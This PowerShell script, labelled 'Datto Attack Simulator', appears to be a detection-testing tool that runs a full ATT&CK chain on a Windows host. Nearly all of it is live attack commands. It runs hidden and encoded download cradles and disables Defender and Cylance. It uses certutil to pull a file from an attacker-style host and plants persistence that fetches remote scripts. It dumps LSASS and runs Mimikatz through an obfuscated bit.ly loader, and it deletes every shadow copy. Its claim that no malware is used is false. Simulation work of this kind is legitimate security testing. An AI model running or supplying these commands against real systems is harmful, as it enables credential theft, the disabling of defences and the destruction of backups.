If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "[Error] You do not have Administrator rights to run this script!`nPlease re-run as an Administrator!"
    Start-Sleep 10
    return
}

Install-Module base64 -Scope CurrentUser 
Install-Module powershell-yaml -Scope CurrentUser
Write-Host "Starting Datto Attack Simulator"
New-Item -Path 'C:\' -Name "AttackSim" -ItemType "directory" -ea 0


Write-Host "Starting Single Endpoint Behavioral Attack Simulation. No malware is used."


#### EXECUTION
Write-Host "Starting Execution Step"

Write-Host "Initiating a T1059.001 - Powershell Download Harness"
Write-Host "(Execution-T1059.001) Detected use of hidden powershell base64 encoded commands"
Write-Host "[ATT&CK T1059.001 - Execution - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/001)"
Powershell.exe -NoP -command "(new-object System.Net.WebClient).DownloadFile('https://live.sysinternals.com/psexec.exe', \`"$env:TEMP\bad.exe\`"); Write-Host T1059.001 - Powershell Download Harness"


Write-Host "Initiating a T1059.001 - Powershell Encoded and hidden Download Harness"
$Cmd = '(new-object System.Net.WebClient).DownloadFile("https://live.sysinternals.com/psexec.exe", "$env:TEMP\bad.exe")'
$EncodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Cmd)
)
powershell.exe -win H -NoP -e $EncodedCommand

Write-Host "Initiating T1059.001 - Powershell Execution From Alternate Data Stream"
powershell.exe -Win N -exec bypass -nop -command { 
    Add-Content -Path $env:TEMP\NTFS_ADS.txt -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand';
    iex (Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream 'streamcommand'| Out-String)
}
Start-Sleep 3
Remove-Item $env:TEMP\NTFS_ADS.txt -Force -ErrorAction Ignore

Start-Sleep 5


# DISCOVERY
Write-Host -ForegroundColor Cyan "`n`nStarting discovery step"

Write-Host "Initiating Discovery - T1082 - System Information Discovery"
Write-Host "When an adversary first gains access to a system, they often gather detailed information about the compromised system and network including users, operating system, hardware, patches, and architecture. Adversaries may use the information to shape follow-on behaviors, including whether or not to fully infect the target and/or attempt specific actions like a ransom.`n"
Powershell.exe -Win N -exec bypass -nop -command { 
    Hostname > recon.txt
    whoami >> recon.txt 
    REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid >> recon.txt
    Systeminfo >> recon.txt
    gpresult /z >> recon.txt
    "NTFS: $((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem -contains 'NTFS')" >> recon.txt
    reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" 2>&1 >> recon.txt
    net localgroup administrators 2>&1 >> recon.txt 
    net group "domain admins" /domain 2>&1 >> recon.txt 
    net group "Exchange Trusted Subsystem" /domain 2>&1 >> recon.txt  
}
Start-Sleep 3
Remove-item recon.txt -ea 0 -force

Start-Sleep 10


#### EVASION
Write-Host -ForegroundColor Cyan "`n`nStarting defense evasion step"
Write-Host "Initiating Defense Evasion - T1089 - Disabling Security Tools"
Write-Host "Disabling Defender..."
powershell.exe -Win N -exec bypass -nop -command 'Set-MpPreference -DisableRealtimeMonitoring $true'
sc config WinDefend start= disabled
sc stop WinDefend

Write-Host "Stopping Cylance..."
Powershell.exe -Win N -exec bypass -nop -command ‘Get-Service CylanceSvc | Stop-Service’
#Powershell.exe -command ‘Get-Service CylanceSvc | Start-Service’


Write-Host "Creating binary with double extension"
Copy-Item -Path C:\Windows\System32\cmd.exe -Destination "C:\AttackSim\AttackSim.pdf.exe"
Write-Host "Initiating double-extension binary execution"
Start-Process -FilePath "C:\AttackSim\AttackSim.pdf.exe"
Start-Sleep 2
Stop-Process -Name AttackSim*


Write-Host "Initiating Defense Evasion - T1027 - Obfuscated Files or Information"
Write-Host "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.`n"
Write-Host "Certutil Download and Decode"
certutil -urlcache -split -f http://imthebadguy.com/a test.txt
certutil -decode -f test.txt WindowsUpdate.exe
Start-Sleep 10
Remove-Item test.txt -Force -ea 0



#### PERSISTENCE
Write-Host -ForegroundColor Cyan "`n`nStarting Foothold / Persistence Step"

Write-Host "Autostart locations like Registry Run Keys or files in User Startup Folders will cause that program to execute when a user logs in or the system reboots. Each autostart may have it’s own trigger for automated execution.`n"
Write-Host "Adding T1547.001 - Registry Run Key Foothold"
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /t REG_SZ /F /D "C:\Windows\System32\calc.exe"
#Start-Sleep 2
#REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /f >nul 2>&1


Write-Host "Adding T1547.001 - Registry Run Key w/ Fileless Powershell Command"
Powershell.exe -Win N -exec bypass -nop -command {
    set-itemproperty HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce "NextRun" 'powershell.exe --command "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`")"'
}
#Start-Sleep 2
#Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name "NextRun" -Force -ErrorAction Ignore

Write-Host "Adding T1547.009 - Malicious Shortcut Link Persistence"
Powershell.exe -Win N -exec bypass -nop -command {
    $Target = "C:\Windows\System32\calc.exe"
    $ShortcutLocation = "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil_calc.lnk"
    $WScriptShell = New-Object -ComObject WScript.Shell
    $Create = $WScriptShell.CreateShortcut($ShortcutLocation)
    $Create.TargetPath = $Target
    $Create.Save()
}
#Start-Sleep 2
#Remove-Item "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil_calc.lnk" -ErrorAction Ignore



Write-Host "Adding Persistence - T1053 - On Logon Scheduled Task Startup Script"
schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe" /f
Write-Host "Adding Persistence - T1053 - On Startup cheduled Task Startup Script"
schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe" /f
Start-sleep 2
#schtasks /delete /tn "T1053_005_OnLogon" /f >nul 2>&1
#schtasks /delete /tn "T1053_005_OnStartup" /f >nul 2>&1

Start-Sleep 10

Write-Host "Testing Persistence by executing T1059.001 - Powershell Command From Registry Key"
$Cmd = 'Write-Host -ForegroundColor Red "Mess with the Best, Die like the rest!"'
$EncodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($Cmd))
reg.exe add "HKEY_CURRENT_USER\Software\Classes\RedTeamTest" /v RT /t REG_SZ /d "V3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFJlZCAiTWVzcyB3aXRoIHRoZSBCZXN0LCBEaWUgbGlrZSB0aGUgcmVzdCEi" /f
Powershell.exe -Win N -exec bypass -nop -command { iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\RedTeamTest').RT))) }
Start-Sleep 2
Remove-Item HKCU:\Software\Classes\RedTeamTest -Force -ErrorAction Ignore



# CREDENTIAL
Write-Host -ForegroundColor Cyan "`nStarting Credential Harvesting step"
Write-Host "Downloading ProcDump.exe"
Invoke-WebRequest -Uri http://live.sysinternals.com/procdump.exe -OutFile 'C:\AttackSim\procdump.exe' -Force
Write-Host "Dumping LSASS memory with ProcDump.exe to extract passwords and tokens"
Start-Process -FilePath 'C:\AttackSim\Procdump.exe' -ArgumentList "-ma lsass.exe lsass.dmp -accepteula" 2>$null -Wait

Write-host "Initiating Credential Access - T1003 - Credential Dumping with Mimikatz"

# Mimikatz
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"


Write-Host "Initiating T1059.001 - Powershell Execution of Mimikatz w/ Obfuscation"
Powershell.exe -Win N -exec bypass -nop -command { 
    (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');
    IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
    (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');
    [ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
    Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';
    SI Variable:/0W 'Net.WebClient';
    Set-Item Variable:\gH 'Default_File_Path.ps1';
    ls _-*;
    Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
    Invoke-Mimikatz -DumpCreds 
}


# LATERAL MOVEMENT
Write-Host -ForegroundColor Cyan "`nStarting Lateral Movement Step"
Write-Host "Adding Passwordless Guest Accounts to Remote Desktop Users"
net localgroup "Remote Desktop Users" Guest /add
Start-Sleep 3
Write-Host "Removing Guest from Remote Desktop Users"
net localgroup "Remote Desktop Users" Guest /delete


#### IMPACT
Write-Host -ForegroundColor Cyan "`nStarting Impact Step"
Write-Host "Testing Rule: Disable Automatic Windows Recovery"
Write-Host "(Impact-T1490) Automatic Windows recovery features disabled"
Write-Host "[ATT&CK T1490 - Impact - Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "0" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "0" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "0" /f


Write-Host "Testing Rule: Shadow Copy Deletion"
Write-Host "(Impact-T1490) Volume shadow copy was deleted"
Write-Host "[ATT&CK T1490 - Impact - Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)"
vssadmin.exe delete shadows /all /quiet


Write-Host "Testing Rule: Wallpaper Defacement"
Write-Host "[ATT&CK T1491 - Impact - Defacement: Internal Defacement](https://attack.mitre.org/techniques/T1491)"
Write-Host "(Impact-T1491) Possible defacement - Wallpaper was changed via commandline"
powershell -Win N -exec bypass -nop -command {
    $oldwallpaper = Get-ItemProperty "HKCU:\Control Panel\Desktop" | select WallPaper -ExpandProperty wallpaper
    reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d $oldwallpaper /f
    RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
}
